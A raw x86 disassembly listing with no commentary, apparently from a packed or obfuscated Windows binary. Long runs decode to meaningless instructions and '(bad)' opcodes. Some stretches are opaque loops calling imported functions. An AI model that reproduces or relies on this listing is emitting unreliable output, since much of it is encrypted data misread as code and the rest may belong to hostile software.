  40e3cc:	addr16 mov ecx,0xda9ac18
  40e3d2:	xor    ebx,DWORD PTR [eax+0x37324d72]
  40e3d8:	shl    cl,0xe2
  40e3db:	push   esi
  40e3dc:	mov    eax,ds:0xa5962b47
  40e3e1:	aas    
  40e3e2:	pop    edi
  40e3e3:	or     eax,DWORD PTR [edi]
  40e3e5:	jle    0x40e3cc
  40e3e7:	(bad)  
  40e3e8:	xchg   ecx,eax
  40e3e9:	xor    al,0xb3
  40e3eb:	push   es
  40e3ec:	and    ecx,0x60
  40e3ef:	scas   al,BYTE PTR es:[edi]
  40e3f0:	inc    ecx
  40e3f1:	pop    ebp
  40e3f2:	in     al,0xde
  40e3f4:	mov    ebp,0x4416d277
  40e3f9:	scas   eax,DWORD PTR es:[edi]
  40e3fa:	imul   ecx,DWORD PTR [edx],0xffffffe0
  40e3fd:	add    eax,0x50c7bb2c
  40e402:	mov    dh,0x6f
  40e404:	xchg   ecx,eax
  40e405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e406:	adc    ebp,DWORD PTR ds:0x1447c66a
  40e40c:	or     DWORD PTR [esi+0x40],eax
  40e40f:	fiadd  DWORD PTR fs:[edx]
  40e412:	scas   eax,DWORD PTR es:[edi]
  40e413:	pop    ecx
  40e414:	repnz or DWORD PTR [esi],esi
  40e417:	mov    edx,0x3b4b77a8
  40e41c:	pop    eax
  40e41d:	pop    eax
  40e41e:	outs   dx,DWORD PTR ds:[esi]
  40e41f:	outs   dx,BYTE PTR ds:[esi]
  40e420:	into   
  40e421:	push   ds
  40e422:	jmp    0x40e3d8
  40e424:	rcr    BYTE PTR [eax+0x72],0xf6
  40e428:	mov    eax,ds:0xb2ac2986
  40e42d:	push   0xffffffde
  40e42f:	xor    al,0x4c
  40e431:	je     0x40e3ff
  40e433:	es xchg edi,eax
  40e435:	mov    ds:0x2a9e0842,al
  40e43a:	shl    BYTE PTR [ecx-0x14],cl
  40e43d:	ins    BYTE PTR es:[edi],dx
  40e43e:	fsubr  QWORD PTR [ebx+ebp*2]
  40e441:	sti    
  40e442:	fiadd  WORD PTR [eax]
  40e444:	push   esp
  40e445:	pop    ecx
  40e446:	call   0xddd2:0x99082b75
  40e44d:	in     al,0xcd
  40e44f:	aam    0x4c
  40e451:	mov    ecx,0x65417bae
  40e456:	pop    edi
  40e457:	outs   dx,DWORD PTR ds:[esi]
  40e458:	dec    ebx
  40e459:	inc    edx
  40e45a:	fistp  QWORD PTR [ebp-0xf068f15]
  40e460:	shl    DWORD PTR [edx-0x19],cl
  40e463:	jno    0x40e3f2
  40e465:	dec    ebx
  40e466:	leave  
  40e467:	sti    
  40e468:	out    0x69,eax
  40e46a:	in     al,dx
  40e46b:	sub    BYTE PTR [ecx],cl
  40e46d:	xchg   edi,eax
  40e46e:	add    al,0x95
  40e470:	aad    0x48
  40e472:	sub    DWORD PTR [esi+0x1271fff0],ebp
  40e478:	push   ebp
  40e479:	test   eax,0x43cfb23
  40e47e:	das    
  40e47f:	repz push esi
  40e481:	inc    edx
  40e482:	mov    bh,0x9f
  40e484:	fbld   TBYTE PTR [eax+0x6e148cfa]
  40e48a:	dec    ebx
  40e48b:	dec    edi
  40e48c:	ficomp WORD PTR [edx-0x4e898245]
  40e492:	pop    ebp
  40e493:	test   eax,0x9850ae6a
  40e498:	std    
  40e499:	repnz bound esi,QWORD PTR [esi+edi*2-0x1d7502e8]
  40e4a1:	xor    ah,BYTE PTR [ebx+0x64]
  40e4a4:	jb     0x40e4d5
  40e4a6:	ds imul ebx,edx,0xffffffa7
  40e4aa:	aaa    
  40e4ab:	fiadd  DWORD PTR [eax]
  40e4ad:	lds    ebp,FWORD PTR [edi+eiz*8]
  40e4b0:	sub    ch,BYTE PTR ds:[edi-0x32]
  40e4b4:	and    eax,0x34761de0
  40e4b9:	xchg   edx,eax
  40e4ba:	adc    al,0x64
  40e4bc:	lock push ebp
  40e4be:	ins    BYTE PTR es:[edi],dx
  40e4bf:	bound  ebp,QWORD PTR [ecx]
  40e4c1:	int3   
  40e4c2:	ss scas eax,DWORD PTR es:[edi]
  40e4c4:	xchg   ebp,eax
  40e4c5:	pop    es
  40e4c6:	jmp    0x580d:0xd39d4bc0
  40e4cd:	aam    0x95
  40e4cf:	ins    BYTE PTR es:[edi],dx
  40e4d0:	test   eax,0x7ed80343
  40e4d5:	cmp    eax,0x355177aa
  40e4da:	or     ecx,DWORD PTR [edi]
  40e4dc:	test   dl,bh
  40e4de:	add    DWORD PTR [eax],eax
  40e4e0:	add    BYTE PTR [ecx+0x43383305],al
  40e4e6:	add    BYTE PTR [ebp-0x74ffffce],bh
  40e4ec:	inc    ebp
  40e4ed:	cld    
  40e4ee:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4f1:	xor    DWORD PTR ds:0x433717,0x4337bf
  40e4fb:	xor    eax,edi
  40e4fd:	add    eax,esi
  40e4ff:	cmp    eax,ecx
  40e501:	mov    DWORD PTR ds:0x433833,0x147f
  40e50b:	je     0x40e6db
  40e511:	and    DWORD PTR ds:0x4337a7,0x0
  40e51b:	jmp    0x40e52b
  40e520:	mov    eax,ds:0x4337a7
  40e525:	inc    eax
  40e526:	mov    ds:0x4337a7,eax
  40e52b:	cmp    DWORD PTR ds:0x4337a7,0x13
  40e532:	jae    0x40e568
  40e538:	cmp    DWORD PTR ds:0x4337a7,0x9
  40e53f:	jne    0x40e54b
  40e545:	call   DWORD PTR ds:0x412030
  40e54b:	cmp    DWORD PTR ds:0x4337a7,0x8
  40e552:	jne    0x40e563
  40e558:	mov    eax,ds:0x4337a7
  40e55d:	inc    eax
  40e55e:	mov    ds:0x4337a7,eax
  40e563:	jmp    0x40e520
  40e568:	mov    eax,DWORD PTR [ebp-0x4]
  40e56b:	sub    edx,DWORD PTR ds:0x4337bb
  40e571:	xor    eax,edi
  40e573:	dec    edx
  40e574:	add    eax,esi
  40e576:	push   eax
  40e577:	adc    DWORD PTR ds:0x4337b3,0x52cc
  40e581:	push   DWORD PTR [ebp-0x8]
  40e584:	or     DWORD PTR ds:0x43377b,edx
  40e58a:	push   DWORD PTR [ebp-0x4]
  40e58d:	mov    edx,DWORD PTR ds:0x413bde
  40e593:	call   0x406864
  40e598:	mov    ecx,DWORD PTR ds:0x413bde
  40e59e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40e5a4:	mov    DWORD PTR [ecx],eax
  40e5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40e5a9:	jmp    0x40e840
  40e5ae:	jmp    0x40e6db
  40e5b3:	xor    dl,BYTE PTR [ebp-0x2e]
  40e5b6:	fs jno 0x40e61a
  40e5b9:	mov    al,0x51
  40e5bb:	sti    
  40e5bc:	adc    eax,0x53c19328
  40e5c1:	dec    ecx
  40e5c2:	popa   
  40e5c3:	iret   
  40e5c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5c5:	jle    0x40e645
  40e5c7:	push   cs
  40e5c8:	jg     0x40e648
  40e5ca:	jle    0x40e63d
  40e5cc:	jo     0x40e590
  40e5ce:	mov    ebp,0xf189bc1
  40e5d3:	cli    
  40e5d4:	jge    0x40e5ee
  40e5d6:	(bad)  
  40e5d7:	jmp    0x4854:0x3fdb1707
  40e5de:	lods   eax,DWORD PTR ds:[esi]
  40e5df:	scas   eax,DWORD PTR es:[edi]
  40e5e0:	std    
  40e5e1:	iret   
  40e5e2:	cs push edx
  40e5e4:	push   eax
  40e5e5:	dec    esi
  40e5e6:	lods   al,BYTE PTR ds:[esi]
  40e5e7:	cwde   
  40e5e8:	mov    esi,0x644e95ef
  40e5ed:	push   cs
  40e5ee:	jae    0x40e601
  40e5f0:	pop    edx
  40e5f1:	mov    gs,WORD PTR [edi+0x2627a530]
  40e5f7:	into   
  40e5f8:	pslld  mm6,QWORD PTR ds:0x5890
  40e5fe:	add    esp,edx
  40e600:	mov    edi,0x589e09d9
  40e605:	scas   eax,DWORD PTR es:[edi]
  40e606:	adc    BYTE PTR [edx],dh
  40e608:	fidivr DWORD PTR [ebx+esi*1+0x41466769]
  40e60f:	nop
  40e610:	dec    ebp
  40e611:	dec    edx
  40e612:	mov    dh,0xb8
  40e614:	cdq    
  40e615:	je     0x40e5da
  40e617:	cmp    bh,BYTE PTR [esi-0x6e0dc105]
  40e61d:	cmp    dl,BYTE PTR [ebx]
  40e61f:	jns    0x40e60b
  40e621:	aam    0x65
  40e623:	pop    es
  40e624:	xchg   ebp,eax
  40e625:	sbb    eax,0xbfb80069
  40e62a:	jnp    0x40e5c9
  40e62c:	dec    esp
  40e62d:	loope  0x40e661
  40e62f:	inc    esp
  40e630:	fistp  WORD PTR [ecx+0x636b7cb4]
  40e636:	push   ebx
  40e637:	mov    ds:0x8ca9c1bb,al
  40e63c:	test   eax,0x14df9cfd
  40e641:	outs   dx,BYTE PTR ds:[esi]
  40e642:	add    bl,dh
  40e644:	xor    DWORD PTR [ecx-0x654c8b5a],ebp
  40e64a:	jle    0x40e659
  40e64c:	adc    eax,0x7736702e
  40e651:	mov    eax,0xf82256f
  40e656:	dec    edx
  40e657:	inc    ebx
  40e658:	xor    edi,DWORD PTR [ecx+0x2a761c8d]
  40e65e:	imul   ebp,DWORD PTR [esi-0x3e0b634],0xaf8983b2
  40e668:	xchg   edi,eax
  40e669:	push   ebp
  40e66a:	gs xor eax,0xc360e895
  40e670:	push   0x6ff06cee
  40e675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e676:	aaa    
  40e677:	mov    ecx,0x33f96e4d
  40e67c:	sub    eax,DWORD PTR ds:0xfd1be401
  40e682:	sub    BYTE PTR [edx-0x27285521],0x9b
  40e689:	xor    al,0x7
  40e68b:	pop    ebp
  40e68c:	(bad)  
  40e68d:	js     0x40e701
  40e68f:	push   ss
  40e690:	xor    eax,0x69f1358b
  40e695:	xchg   BYTE PTR [edi+0x4cf9c4f9],dl
  40e69b:	xor    eax,0x79e4f212
  40e6a0:	jnp    0x40e65f
  40e6a2:	pop    edi
  40e6a3:	lds    ebp,FWORD PTR [esi]
  40e6a5:	mov    ch,0xb4
  40e6a7:	shl    edx,1
  40e6a9:	daa    
  40e6aa:	mov    dl,0xd9
  40e6ac:	and    al,0x9d
  40e6ae:	shl    BYTE PTR [ebp-0x2f],1
  40e6b1:	je     0x40e648
  40e6b3:	sub    BYTE PTR [ecx-0x32],dh
  40e6b6:	add    cl,BYTE PTR [eax-0x26]
  40e6b9:	and    DWORD PTR [eax],esi
  40e6bb:	(bad)
  40e6be:	add    bh,BYTE PTR [ecx-0x23]
  40e6c1:	jle    0x40e674
  40e6c3:	mov    BYTE PTR [ebx],al
  40e6c5:	sbb    esp,DWORD PTR [ecx]
  40e6c7:	iret   
  40e6c8:	sub    DWORD PTR [eax+0x64],eax
  40e6cb:	dec    edi
  40e6cc:	push   esi
  40e6cd:	add    ecx,0xe07670a3
  40e6d3:	test   bh,bl
  40e6d5:	xor    eax,0x48b03996
  40e6da:	cmc    
  40e6db:	mov    eax,DWORD PTR [ebp-0x4]
  40e6de:	mov    ecx,DWORD PTR [ebp+0x10]
  40e6e1:	xor    eax,edi
  40e6e3:	add    eax,esi
  40e6e5:	cmp    eax,ecx
  40e6e7:	jne    0x40e83d
  40e6ed:	mov    eax,DWORD PTR [ebp-0x4]
  40e6f0:	xor    eax,edi
  40e6f2:	add    eax,esi
  40e6f4:	jmp    0x40e821
  40e6f9:	xor    BYTE PTR [ebx+0x7369636a],al
  40e6ff:	xor    DWORD PTR [ecx+0x23],edx
  40e702:	mov    ebp,0xb1c730a1
  40e707:	push   ebx
  40e708:	aaa    
  40e709:	fbld   TBYTE PTR [edx+0x7f0e7e7e]
  40e70f:	jle    0x40e78f
  40e711:	call   0xfa3b0815
  40e716:	xchg   ebp,eax
  40e717:	push   eax
  40e718:	and    esp,DWORD PTR [edi+0x271db572]
  40e71e:	in     eax,0xd
  40e720:	xchg   esp,eax
  40e721:	cmp    DWORD PTR [ebx],0x7f3d27ab
  40e727:	or     edi,DWORD PTR [eax-0x51]
  40e72a:	jns    0x40e771
  40e72c:	cmp    al,0xb5
  40e72e:	es jb  0x40e6c5
  40e731:	dec    esi
  40e732:	sar    DWORD PTR [eax+edx*1+0x6cff8210],cl
  40e739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e73a:	fidiv  WORD PTR [esi+0x3ed7cff]
  40e740:	push   esi
  40e741:	push   esp
  40e742:	and    eax,DWORD PTR [ebx-0x2e]
  40e745:	fwait
  40e746:	add    ebp,0x97041663
  40e74c:	dec    esi
  40e74d:	imul   edi,DWORD PTR [ebx-0x2b5daaaa],0xf6f9191e
  40e757:	mov    bl,0x22
  40e759:	test   al,0x24
  40e75b:	std    
  40e75c:	pushf  
  40e75d:	mov    ds:0x822e2314,al
  40e762:	sti    
  40e763:	sub    ebp,eax
  40e765:	cli    
  40e766:	sti    
  40e767:	mov    sp,0x9f90
  40e76b:	push   eax
  40e76c:	jmp    0x40e7bd
  40e76e:	sbb    BYTE PTR [ebx-0x4a4e033d],bl
  40e774:	xlat   BYTE PTR ds:[ebx]
  40e775:	mov    esp,0x682dab43
  40e77a:	push   eax
  40e77b:	dec    eax
  40e77c:	mov    ebx,0xf86b9947
  40e781:	push   es
  40e782:	fcomp  QWORD PTR [edx-0x17]
  40e785:	mov    DWORD PTR [ebp+esi*8-0x4],ebp
  40e789:	std    
  40e78a:	and    DWORD PTR [edi],ebp
  40e78c:	pop    ss
  40e78d:	adc    bh,BYTE PTR [edi-0x540a9e6a]
  40e793:	adc    eax,0xc9f0f027
  40e798:	xchg   edx,eax
  40e799:	or     ebp,DWORD PTR [ebx]
  40e79b:	dec    esp
  40e79c:	sbb    BYTE PTR [esi],dh
  40e79e:	ret    0x63e9
  40e7a1:	sub    bh,BYTE PTR [edi-0x76891bb4]
  40e7a7:	mov    ds:0x37abaff7,al
  40e7ac:	std    
  40e7ad:	sbb    eax,0xfbb7fb1b
  40e7b2:	ds push esi
  40e7b4:	out    0x22,al
  40e7b6:	xchg   BYTE PTR [ecx+ecx*8+0x3f667d61],dh
  40e7bd:	inc    esi
  40e7be:	jge    0x40e792
  40e7c0:	mul    BYTE PTR [esi]
  40e7c2:	int    0xc7
  40e7c4:	enter  0x4afe,0x1f
  40e7c8:	(bad)
  40e7cc:	inc    esp
  40e7cd:	aam    0x32
  40e7cf:	jmp    0x5453:0x3f7707b6
  40e7d6:	mov    al,0x6f
  40e7d8:	mov    ah,0x57
  40e7da:	cmp    BYTE PTR [eax+0x4e43bf53],bh
  40e7e0:	rol    BYTE PTR [edi],0xe7
  40e7e3:	aaa    
  40e7e4:	jnp    0x40e83b
  40e7e6:	inc    esi
  40e7e7:	mov    dh,dl
  40e7e9:	mov    cl,0x50
  40e7eb:	ja     0x40e809
  40e7ed:	mov    ebx,0x8b3dbfcc
  40e7f2:	stos   BYTE PTR es:[edi],al
  40e7f3:	adc    al,0x6a
  40e7f5:	shl    DWORD PTR [ebx+0x6ad9d27e],cl
  40e7fb:	inc    ebp
  40e7fc:	ret    0x3a97
  40e7ff:	mov    eax,ds:0xad114c73
  40e804:	test   dl,dl
  40e806:	push   ebp
  40e807:	lods   al,BYTE PTR ds:[esi]
  40e808:	or     al,0xd2
  40e80a:	frstor [ebp+ebx*2-0x78]
  40e80e:	popf   
  40e80f:	xchg   DWORD PTR [edi+0x1b6b7183],ebp
  40e815:	enter  0x1d34,0xe5
  40e819:	xchg   edi,eax
  40e81a:	loope  0x40e86c
  40e81c:	ja     0x40e88c
  40e81e:	mov    DWORD PTR [edi+0x3c62a30c],eax
  40e824:	inc    ecx
  40e825:	add    BYTE PTR [ebx-0x38cc03bb],cl
  40e82b:	add    eax,esi
  40e82d:	mov    ds:0x413c5a,eax
  40e832:	push   DWORD PTR [ebp-0x8]
  40e835:	push   DWORD PTR [ebp-0x4]
  40e838:	call   0x40e84a
  40e83d:	mov    eax,DWORD PTR [ebp-0x4]
  40e840:	xor    eax,edi
  40e842:	pop    edi
  40e843:	add    eax,esi
  40e845:	pop    esi
  40e846:	leave  
  40e847:	ret    0xc
  40e84a:	push   ebp
  40e84b:	mov    ebp,esp
  40e84d:	sub    esp,0x60
  40e850:	mov    eax,DWORD PTR [ebp+0x8]
  40e853:	push   ebx
  40e854:	and    DWORD PTR ds:0x43383f,0x0
  40e85e:	jmp    0x40e870
  40e863:	mov    ebx,DWORD PTR ds:0x43383f
  40e869:	inc    ebx
  40e86a:	mov    DWORD PTR ds:0x43383f,ebx
  40e870:	cmp    DWORD PTR ds:0x43383f,0x19
  40e877:	jae    0x40e8a2
  40e87d:	cmp    DWORD PTR ds:0x43383f,0x1e
  40e884:	jne    0x40e893
  40e88a:	push   DWORD PTR [ebp-0x14]
  40e88d:	call   DWORD PTR ds:0x412034
  40e893:	jmp    0x40e863
  40e898:	sub    DWORD PTR ds:0x4337bf,0x283f
  40e8a2:	push   esi
  40e8a3:	and    DWORD PTR ds:0x4337ff,0x0
  40e8ad:	mov    esi,DWORD PTR ds:0x4337ff
  40e8b3:	inc    esi
  40e8b4:	mov    DWORD PTR ds:0x4337ff,esi
  40e8ba:	cmp    DWORD PTR ds:0x4337ff,0x10
  40e8c1:	jne    0x40e8d5
  40e8c7:	push   0x43377f
  40e8cc:	push   DWORD PTR [ebp-0x28]
  40e8cf:	call   DWORD PTR ds:0x4123ac
  40e8d5:	cmp    DWORD PTR ds:0x4337ff,0xf
  40e8dc:	jne    0x40e8ef
  40e8e2:	mov    esi,DWORD PTR ds:0x4337ff
  40e8e8:	inc    esi
  40e8e9:	mov    DWORD PTR ds:0x4337ff,esi
  40e8ef:	cmp    DWORD PTR ds:0x4337ff,0x1a
  40e8f6:	jb     0x40e8ad
  40e8fc:	mov    DWORD PTR ds:0x4337f7,0x1e
  40e906:	cmp    DWORD PTR ds:0x4337f7,0x0
  40e90d:	je     0x40e960
  40e913:	cmp    DWORD PTR ds:0x4337f7,0xc
  40e91a:	jne    0x40e933
  40e920:	push   0x6d58
  40e925:	push   DWORD PTR [ebp-0x20]
  40e928:	push   0x30b0
  40e92d:	call   DWORD PTR ds:0x4121e0
  40e933:	cmp    DWORD PTR ds:0x4337f7,0xd
  40e93a:	jne    0x40e94d
  40e940:	mov    ebx,DWORD PTR ds:0x4337f7
  40e946:	dec    ebx
  40e947:	mov    DWORD PTR ds:0x4337f7,ebx
  40e94d:	mov    ebx,DWORD PTR ds:0x4337f7
  40e953:	dec    ebx
  40e954:	mov    DWORD PTR ds:0x4337f7,ebx
  40e95a:	jmp    0x40e906
  40e95f:	dec    esi
  40e960:	mov    esi,0x7510854
  40e965:	xor    eax,esi
  40e967:	mov    ebx,0x32729b
  40e96c:	add    eax,ebx
  40e96e:	and    DWORD PTR ds:0x4337a7,0x3e06
  40e978:	push   edi
  40e979:	neg    DWORD PTR ds:0x43372b
  40e97f:	mov    DWORD PTR [ebp-0x18],eax
  40e982:	and    DWORD PTR ds:0x43371b,0x0
  40e98c:	mov    edi,DWORD PTR ds:0x43371b
  40e992:	inc    edi
  40e993:	mov    DWORD PTR ds:0x43371b,edi
  40e999:	cmp    DWORD PTR ds:0x43371b,0x21
  40e9a0:	jne    0x40e9b4
  40e9a6:	push   DWORD PTR [ebp-0x1c]
  40e9a9:	push   0x4337bb
  40e9ae:	call   DWORD PTR ds:0x4121e4
  40e9b4:	cmp    DWORD PTR ds:0x43371b,0x12
  40e9bb:	jb     0x40e98c
  40e9c1:	sbb    DWORD PTR ds:0x43371b,edx
  40e9c7:	mov    edi,DWORD PTR [ebp+0x8]
  40e9ca:	xor    edi,esi
  40e9cc:	and    DWORD PTR ds:0x43376b,0x43370f
  40e9d6:	mov    DWORD PTR [ebp-0xc],0xf89c85f1
  40e9dd:	adc    DWORD PTR ds:0x433837,0x4337bf
  40e9e7:	mov    DWORD PTR [ebp-0x10],0xf89c8731
  40e9ee:	sub    DWORD PTR ds:0x43377f,0x4337bb
  40e9f8:	add    edi,ebx
  40e9fa:	mov    DWORD PTR ds:0x4337ab,0x5e0d
  40ea04:	jmp    0x40f1b9
  40ea09:	cmp    edi,0x40
  40ea0c:	jne    0x40ec91
  40ea12:	movzx  eax,BYTE PTR ds:0x43371f
  40ea19:	mov    eax,ds:0x413a5e
  40ea1e:	jmp    0x40ec4b
  40ea23:	xchg   BYTE PTR [edi],dh
  40ea25:	inc    ebx
  40ea26:	(bad)  
  40ea27:	jae    0x40ea94
  40ea29:	push   edx
  40ea2a:	aaa    
  40ea2b:	mov    ds:0x6103a68,al
  40ea30:	jecxz  0x40ea91
  40ea32:	sub    bh,0xa3
  40ea35:	jle    0x40eab5
  40ea37:	push   cs
  40ea38:	jl     0x40eab8
  40ea3a:	jle    0x40ea28
  40ea3c:	lahf   
  40ea3d:	pop    edx
  40ea3e:	mov    ebx,0x8e0d6df
  40ea43:	mov    ds:0xf0bc0521,eax
  40ea48:	cmp    eax,0x8323d0ea
  40ea4d:	and    al,0xbd
  40ea4f:	aad    0x94
  40ea51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea52:	fidiv  WORD PTR [ebp+0x463ca9e3]
  40ea58:	xor    al,0x5c
  40ea5a:	lods   eax,DWORD PTR ds:[esi]
  40ea5b:	fsubr  DWORD PTR [ebx+eiz*1]
  40ea5e:	mov    esp,0xf4e02763
  40ea63:	push   edi
  40ea64:	or     DWORD PTR [edx],0x9effc4be
  40ea6a:	mov    dh,0x67
  40ea6c:	aaa    
  40ea6d:	push   edx
  40ea6e:	pop    eax
  40ea6f:	push   eax
  40ea70:	sbb    al,0xd5
  40ea72:	xchg   edi,eax
  40ea73:	ret    0x1db3
  40ea76:	pushf  
  40ea77:	push   esp
  40ea78:	xchg   edx,eax
  40ea79:	jne    0x40eaec
  40ea7b:	popf   
  40ea7c:	vdivpd xmm3,xmm5,XMMWORD PTR [ebx-0x63800cd3]
  40ea84:	sub    al,0xa0
  40ea86:	pop    ds
  40ea87:	push   es
  40ea88:	loope  0x40ea7a
  40ea8a:	sub    eax,0xdbb28bed
  40ea8f:	cmp    BYTE PTR [eax],ah
  40ea91:	inc    eax
  40ea92:	jp     0x40eab6
  40ea94:	or     dl,dh
  40ea96:	retf   
  40ea97:	add    al,0xe1
  40ea99:	sbb    al,0x4
  40ea9b:	sub    bl,ah
  40ea9d:	lds    eax,FWORD PTR [edi-0x5c]
  40eaa0:	das    
  40eaa1:	cmp    DWORD PTR [edx],ebp
  40eaa3:	jp     0x40ea85
  40eaa5:	push   0xfbb7c60f
  40eaaa:	pop    esi
  40eaab:	xor    DWORD PTR [eax+0x28],edi
  40eaae:	add    ebx,esp
  40eab0:	dec    ebx
  40eab1:	or     al,0x65
  40eab3:	and    dh,BYTE PTR ds:0xef827565
  40eab9:	mov    dl,0xe4
  40eabb:	loop   0x40eaf3
  40eabd:	fimul  WORD PTR [edx+0x7f796df4]
  40eac3:	shr    BYTE PTR [esi-0x20],0xd7
  40eac7:	shr    BYTE PTR [ebx+0x10fde8e3],1
  40eacd:	cmp    BYTE PTR [eax],ah
  40eacf:	sbb    DWORD PTR [edx+0xb],0xffffff8a
  40ead3:	lahf   
  40ead4:	ret    0x2ab4
  40ead7:	das    
  40ead8:	dec    edx
  40ead9:	inc    esi
  40eada:	sub    BYTE PTR [edx],al
  40eadc:	(bad)  
  40eadd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eadf:	scas   al,BYTE PTR es:[edi]
  40eae0:	jg     0x40ea67
  40eae2:	dec    ebx
  40eae3:	add    BYTE PTR [edi+edi*1-0x2fc262d3],ch
  40eaea:	or     DWORD PTR [esi],esi
  40eaec:	(bad)  
  40eaed:	outs   dx,DWORD PTR ds:[esi]
  40eaee:	ret    0xcb23
  40eaf1:	sbb    eax,DWORD PTR [ebx]
  40eaf3:	in     eax,0x7e
  40eaf5:	repz bound eax,QWORD PTR [ecx]
  40eaf8:	ins    BYTE PTR es:[edi],dx
  40eaf9:	retf   0x5d4c
  40eafc:	(bad)  
  40eafd:	xchg   esp,eax
  40eafe:	inc    esi
  40eaff:	and    DWORD PTR [edx-0x3822a538],edx
  40eb05:	nop
  40eb06:	popf   
  40eb07:	adc    BYTE PTR [ebx-0x62],ah
  40eb0a:	sbb    DWORD PTR [ecx],ebx
  40eb0c:	lock jecxz 0x40eb1d
  40eb0f:	dec    edx
  40eb10:	mov    al,0xcf
  40eb12:	(bad)  
  40eb13:	fmul   QWORD PTR [edx-0x7a]
  40eb16:	sbb    bl,BYTE PTR [esi+0x28b714ff]
  40eb1c:	xchg   eax,ebp
  40eb1e:	mov    DWORD PTR [ebx+eiz*1],eax
  40eb21:	and    ebp,DWORD PTR [edi-0x75387546]
  40eb27:	jmp    0x68cc:0x58eabf44
  40eb2e:	(bad)  
  40eb2f:	mov    eax,0xf1f3e2cb
  40eb34:	adc    al,0x3d
  40eb36:	or     eax,0xe410be6f
  40eb3b:	loopne 0x40eb3d
  40eb3d:	lea    ebp,[ebx+0x2f]
  40eb40:	push   cs
  40eb41:	sbb    BYTE PTR [ebx-0x3cc6c1a2],dl
  40eb47:	das    
  40eb48:	stos   BYTE PTR es:[edi],al
  40eb49:	mov    dh,0x48
  40eb4b:	xor    esi,DWORD PTR [ebp-0x796c9ad5]
  40eb51:	in     eax,0x28
  40eb53:	push   ds
  40eb54:	jecxz  0x40eb2d
  40eb56:	pusha  
  40eb57:	xor    al,0xc5
  40eb59:	sbb    al,0xbe
  40eb5b:	add    al,0xb4
  40eb5d:	xchg   esp,eax
  40eb5e:	and    ch,BYTE PTR [edx]
  40eb60:	dec    esi
  40eb61:	scas   al,BYTE PTR es:[edi]
  40eb62:	mov    ecx,0xc7317b28
  40eb67:	cmp    eax,0x4424e7cc
  40eb6c:	xchg   ecx,eax
  40eb6d:	xlat   BYTE PTR ds:[ebx]
  40eb6e:	jl     0x40eb76
  40eb70:	inc    edx
  40eb71:	xchg   al,dh
  40eb73:	in     eax,dx
  40eb74:	mov    bh,BYTE PTR [edx]
  40eb76:	sub    DWORD PTR [ecx+eax*2],ecx
  40eb79:	fstp   QWORD PTR [esi+0x7961853a]
  40eb7f:	cmp    cl,dl
  40eb81:	inc    eax
  40eb82:	xor    al,0x7b
  40eb84:	sar    BYTE PTR [eax],0x8a
  40eb87:	or     bl,dh
  40eb89:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb8b:	retf   
  40eb8c:	inc    ebp
  40eb8d:	nop
  40eb8e:	mov    al,ds:0xef73d75
  40eb93:	mov    esi,0x33a1328c
  40eb98:	pop    ecx
  40eb99:	mov    ebp,0xc92e5988
  40eb9e:	in     al,0x4b
  40eba0:	jnp    0x40eb97
  40eba2:	add    dh,cl
  40eba4:	popf   
  40eba5:	sub    eax,0xe94edf17
  40ebaa:	ins    DWORD PTR es:[edi],dx
  40ebab:	cmp    edx,eax
  40ebad:	(bad)  
  40ebae:	sbb    bh,BYTE PTR [edx]
  40ebb0:	stos   BYTE PTR es:[edi],al
  40ebb1:	or     DWORD PTR [eax],edx
  40ebb3:	bnd jb 0x40eb8d
  40ebb6:	rcr    BYTE PTR [ecx-0x3b],0xe
  40ebba:	xchg   DWORD PTR [edi-0x2f11dafc],ebp
  40ebc0:	ds ja  0x40ebf2
  40ebc3:	repnz ins BYTE PTR es:[edi],dx
  40ebc5:	push   eax
  40ebc6:	sti    
  40ebc7:	arpl   WORD PTR [ebp-0x38fce1fb],di
  40ebcd:	(bad)  
  40ebce:	in     eax,0x99
  40ebd0:	bound  edi,QWORD PTR ss:[ecx+0x6]
  40ebd4:	es inc ebp
  40ebd6:	test   BYTE PTR [esi],0x11
  40ebd9:	stc    
  40ebda:	pop    esp
  40ebdb:	les    esp,FWORD PTR [ebp+0x704b468d]
  40ebe1:	sbb    DWORD PTR [eax-0x2f],ecx
  40ebe4:	data16 sub BYTE PTR es:[edi],al
  40ebe8:	cmc    
  40ebe9:	push   ecx
  40ebea:	fsubr  QWORD PTR [esi]
  40ebec:	sbb    DWORD PTR [edx+0x5b7594c9],ebp
  40ebf2:	ja     0x40ebb6
  40ebf4:	(bad)  
  40ebf6:	lea    edx,[ecx-0x73]
  40ebf9:	iret   
  40ebfa:	adc    al,0x70
  40ebfc:	or     eax,0x17488adb
  40ec01:	adc    DWORD PTR [eax],eax
  40ec03:	add    al,BYTE PTR [eax]
  40ec05:	mov    edx,0x820d743e
  40ec0a:	fbld   TBYTE PTR [edx]
  40ec0c:	(bad)  
  40ec0d:	leave  
  40ec0e:	mov    ds:0x67c07838,al
  40ec13:	cs xchg edx,eax
  40ec15:	fist   DWORD PTR [edx-0x25]
  40ec18:	cmc    
  40ec19:	jmpw   0x5071
  40ec1d:	les    eax,FWORD PTR [esi]
  40ec1f:	stc    
  40ec20:	dec    esp
  40ec21:	xchg   edx,eax
  40ec22:	ret    0xda73
  40ec25:	sub    ah,al
  40ec27:	iret   
  40ec28:	add    ecx,esi
  40ec2a:	loop   0x40ebec
  40ec2c:	(bad)  
  40ec2d:	sub    DWORD PTR [ecx-0x278d5cdd],ecx
  40ec33:	inc    ecx
  40ec34:	das    
  40ec35:	push   ss
  40ec36:	xor    DWORD PTR [ebx-0x64],0xec0a9842
  40ec3d:	idiv   BYTE PTR ds:[edx]
  40ec40:	pop    ds
  40ec41:	mov    ds:0x39dceab2,eax
  40ec46:	jo     0x40ec7d
  40ec48:	mov    ebx,0x8b778d
  40ec4d:	mov    DWORD PTR ds:0x4337eb,0x3f94
  40ec57:	mov    DWORD PTR [ebp-0x14],eax
  40ec5a:	mov    DWORD PTR ds:0x4337b3,0x877
  40ec64:	mov    eax,ds:0x413c66
  40ec69:	mov    DWORD PTR ds:0x43372f,0x4b6e
  40ec73:	mov    eax,DWORD PTR [eax]
